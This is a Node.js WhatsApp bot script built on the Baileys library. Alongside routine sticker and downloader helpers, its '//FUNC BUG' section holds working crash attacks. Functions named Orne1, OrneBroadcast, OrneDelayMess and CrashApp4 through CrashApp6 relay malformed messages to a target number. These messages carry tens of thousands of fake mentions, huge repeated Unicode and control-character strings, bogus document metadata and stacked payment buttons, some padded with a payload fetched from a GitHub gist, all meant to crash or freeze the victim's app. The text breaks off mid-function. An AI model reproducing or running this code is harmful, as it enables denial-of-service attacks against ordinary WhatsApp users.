//SC BY ALDZ DEVELOPER
// ENC HARD

require('./config');
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const sharp = require('sharp')
const pino = require('pino');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const figlet = require('figlet');
const yts = require('yt-search');
const gradient = require('gradient-string');
const readline = require("readline");
const logger = pino({ level: 'debug' });
const JsConfuser = require("js-confuser");
const search = require("yt-search");
const { youtube } = require("btch-downloader");
const fetch = require('node-fetch');
const { GoogleGenerativeAI } = require ("@google/generative-ai");
const { Client } = require('ssh2');
const crypto = require('crypto');
const makeid = crypto.randomBytes(3).toString('hex')
const { Sticker } = require("wa-sticker-formatter");

const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')


module.exports = client = async (client, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        const content = JSON.stringify(m.message)
        
        const isText = ["extendedTextMessage", "conversation"].includes(m.mtype)
		const isImage = ["imageMessage"].includes(m.mtype)
		const isVideo = ["videoMessage"].includes(m.mtype)
		const isSticker = ["stickerMessage"].includes(m.mtype)
		const isAudio = ["audioMessage"].includes(m.mtype) && !(m.message[m.mtype]?.ptt)
		const isVoice = ["audioMessage"].includes(m.mtype) && !!(m.message[m.mtype]?.ptt)
		const isViewOnce = ["viewOnceMessageV2", "viewOnceMessage"].includes(m.mtype)
		const isContact = ["contactMessage", "contactsArrayMessage"].includes(m.mtype)
		const isLocation = ["locationMessage"].includes(m.mtype)
		const isDocument = ["documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isProtocol = ["protocolMessage"].includes(m.mtype)
		const isPollUpdate = ["pollUpdateMessage"].includes(m.mtype)
		const isPollCreation = ["pollCreationMessage"].includes(m.mtype)
		const isButtonList = ["interactiveResponseMessage"].includes(m.mtype)
		const isButtonReply = ["templateButtonReplyMessage"].includes(m.mtype)
		const isAllMedia = ["imageMessage", "videoMessage", "stickerMessage", "audioMessage", "viewOnceMessageV2", "viewOnceMessage", "contactMessage", "contactsArrayMessage", "locationMessage", "documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
 const getQuoted = (m.quoted || m)      
        const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
        
        const sender = m.key.fromMe ? client.user.id.split(":")[0] + "@s.whatsapp.net" || client.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = global.prefa

        const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : ''
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
        const creator = JSON.parse(fs.readFileSync('./database/owner.json'))
        const botNumber = await client.decodeJid(client.user.id);
        const isPremium = premium.includes(m.sender)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const isCreator = [botNumber, ...creator, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const text = q = args.join(" ");
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await client.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        
            const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunction');
        
const { pinterest, pinterest2, remini, mediafire, tiktokDl , spotifyDl , searchSpotifyTracks, convertDuration, convertAngka, ytdl, tiktokSearchVideo, delay, text2img, listModels, getModels, listSampler, pickRandom, getJobs, spotifyDown, rsz } = require('./lib/scraper');

 const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('./lib/exif')  

        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#e74c3c").bold(`New Message`));
            console.log(
                chalk.bgHex("#00FF00").black(
                    `   -> Pesan: ${m.body || m.mtype} \n` +
                    `   -> Pengirim: ${pushname} \n` +
                    `   -> JID: ${senderNumber}`
                )
            );
            
            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#00FF00").black(
                        `   -> Grup: ${groupName} \n` +
                        `   -> GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        const reaction = async (jidss, emoji) => {
            client.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
        
const imageUrls = [
        `${UrlThumb1}`, 
        `${UrlThumb2}`, 
        `${UrlThumb3}`
    ]; 
    
    const randomIndex = Math.floor(Math.random() * imageUrls.length);
    const ImageUrlRandom = imageUrls[randomIndex];

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
        const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
//END       

        client.ments = async (text) => {
    return [m.sender];
};

// Untuk Pp user or Qc
let ppuser
           try {
           ppuser = await client.profilePictureUrl(m.sender, 'image')
           } catch (err) {
           ppuser = `${UrlThumb1}`
           }
            

// Fake Qouted
	// Pengiriman Quoted Fake Permintaan Bayaran //
        const qpay = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso8583: "BRL", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "ØⱤ₦Ɇ ₵Ɽ₳₴ⱧɆĐ"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 7777, currencyCode: "BRL"}}}}
        
	// Pengiriman Quoted Fake Produk Troli //
	const qtroli = {key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2024,status: 200, thumbnail: ppuser, surface: 200, message: `ØⱤ₦Ɇ ₵Ɽ₳₴ⱧɆĐ`, orderTitle: 't.me/Aldzofficial', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
	
   // Pengiriman Quoted Fake Kontak
		const qkontak = {key: {participant: `0@s.whatsapp.net`,
		...(botNumber ? {remoteJid: `status@broadcast`} : {})},message: {'contactMessage': {'displayName': `ØⱤ₦Ɇ ₵Ɽ₳₴ⱧɆĐ`,'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6283122635477:+62 831-2263-5477\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,sendEphemeral: true}}}

const reply = async (teks) => {
return client.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: "ØⱤ₦Ɇ ₵Ɽ₳₴ⱧɆĐ", 
body: `© 𝐀𝐥𝐝𝐳 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫`, 
thumbnailUrl: global.UrlThumb1, 
sourceUrl: null, 
}}}, {quoted: qpay })
}

const nomerCreator = 
[
'6283122635477@s.whatsapp.net',
'6283129626211@s.whatsapp.net'
] 

// FUNC STIKER
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
        
async function makeStickerFromUrl(imageUrl, client, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await client.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `Sasuke Crash`,
                    body: `Erlangga Developer `,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: "https://files.catbox.moe/ggjkbc.jpg", 
                    sourceUrl: `https://t.me/Aldzofficial`
                }
            }
        }, { quoted: qmime });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

 async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
 // Qc
 client.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)
}
await client.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}
// FUNC HARI
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')


//FUNC BUG
async function Orne1(target, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "@Ornenibos",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( # )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(target, MSG, {});

await client.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await client.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 𝗔𝗺𝗯𝗮-𝗖𝗿𝗮𝘀𝗵" },
content: undefined
}
]
}
);
}
}
async function OrneBroadcast(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Orne Crash Version 1.0 Here",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (client) {
        await client.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Orne Crash Version 1.0 Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function OrneDelayMess(target) {
    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "xnxxx.com",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Orne Crash Version 1.0 Is Back\n" + "@062598121203".repeat(17000)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "cta_url",
                            buttonParamsJson: "{ display_text: 'Venzo Bot', url: \"https://youtube.com/@AldzOfficial\", merchant_url: \"https://youtube.com/@AldzOfficial\" }"
                        }, {
                            name: "call_permission_request",
                            buttonParamsJson: "{}"
                        }],
                        messageParamsJson: "{}"
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "xvideos.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await client.relayMessage(target, message, {
        participant: { jid: target }
    });
}
async function CrashApp6(isTarget) {
let apiClient;
try {
  const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}
let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    clientCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOnclientCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });
    
  let msg = await generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            mentionedJid: [isTarget],
           forwardedNewsletterMessageInfo: {
          newsletterJid: "9741@newsletter",
        serverMessageId: 1,
     newsletterName: "-"
     },
            externalAdReply: {
              showAdAttribution: true,
              title: "ØⱤ₦Ɇ ₵Ɽ₳₴ⱧɆĐ V1.5",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://tama.app/",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: isTarget,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "ØⱤ₦Ɇ ₵Ɽ₳₴ⱧɆĐ V1.5",
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Ryuichi - Beginner\",\"body\":\"Call Galaxy\"}",
              buttons: [
                { name: "single_select", buttonParamsJson: apiClient + "᭡꧈", },
                { name: "call_permission_request", buttonParamsJson: apiClient + "᭡꧈", }, 
                { name: "payment_method", buttonParamsJson: venomModsData + "᭡꧈" },
                { name: "payment_status", buttonParamsJson: venomModsData + "᭡꧈" },
                { name: "review_order", buttonParamsJson: apiClient + "᭡꧈" },
                { name: "extensions_message_v2", buttonParamsJson: venomModsData + "᭡꧈", },
                { name: "landline_call", buttonParamsJson: venomModsData + "᭡꧈", },
                { name: "mpm", buttonParamsJson: apiClient + "ØⱤ₦Ɇ ₵Ɽ₳₴ⱧɆĐ", },
               { name: "automated_greeting_message_view_catalog", buttonParamsJson: apiClient + "᭡꧈", },
               { name: "open_webview", buttonParamsJson: apiClient + "᭡꧈", },
               { name: "message_with_link_status", buttonParamsJson: apiClient + "᭡꧈", },
              { name: "call_permission_request", buttonParamsJson: venomModsData + "᭡꧈", voice_call: "call_galaxy" },
              { name: "form_message", buttonParamsJson: venomModsData + "᭡꧈",},
              { name: "wa_payment_learn_more", buttonParamsJson: apiClient + "᭡꧈", },
              { name: "wa_payment_transaction_details", buttonParamsJson: apiClient + "᭡꧈", },
              { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "᭡꧈", },
              ],
            },
          },
        },
      },
    },
    {}
  );
  await client.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
  console.log(" Succes Send Bug By AldzDev ")
 }
async function CrashApp5(target) {
let apiClient;
try {
  const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}
    let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    clientCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOnclientCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    let stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: `᭡꧈      - 〽${"ꥈ  ꥈ".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `᭡꧈""""" ${"﹏".repeat(102002)}`,
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: target },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                    },
                    body: {
                    text: "\u0003" + "᭡ꦽ꧈".repeat(102002) + "\u0003".repeat(102002)
                    }, 
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_method", buttonParamsJson: apiClient + "\u0003".repeat(9999) },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                            { name: "form_message", buttonParamsJson: apiClient + "\u0003".repeat(9999) },
                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_transaction_details", buttonParamsJson: apiClient + "\u0003".repeat(9999) },
                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "catalog_message", buttonParamsJson: apiClient + "\u0003".repeat(9999) },
                            { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_order", buttonParamsJson: apiClient + "\u0003".repeat(9999) },
                            { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payments_care_csat", buttonParamsJson: apiClient + "\u0003".repeat(9999) },
                            { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_settings", buttonParamsJson: apiClient + "\u0003".repeat(9999) },
                            { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: apiClient + "\u0003".repeat(9999) },
                            { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "message_with_link_status", buttonParamsJson: apiClient + "\u0003".repeat(9999) },
                            { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_costum", buttonParamsJson: apiClient + "\u0003".repeat(9999) },
                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "landline_call", buttonParamsJson: apiClient + "\u0003".repeat(9999) },
                            { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_copy", buttonParamsJson: apiClient + "\u0003".repeat(9999) },
                            { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_and_pay", buttonParamsJson: apiClient + "\u0003".repeat(9999) },
                            { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_call", buttonParamsJson: apiClient + "\u0003".repeat(9999) }
                        ]
                    }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };
    await client.relayMessage(target, message, { participant: { jid: target } });
    console.log(" Succes Send Bug By AldzDev ")
}
async function CrashApp4(target) {
let apiClient;
try {
  const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}
let Apiclient = JSON.stringify({
        status: true,
        criador: "AldzDeveloper",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
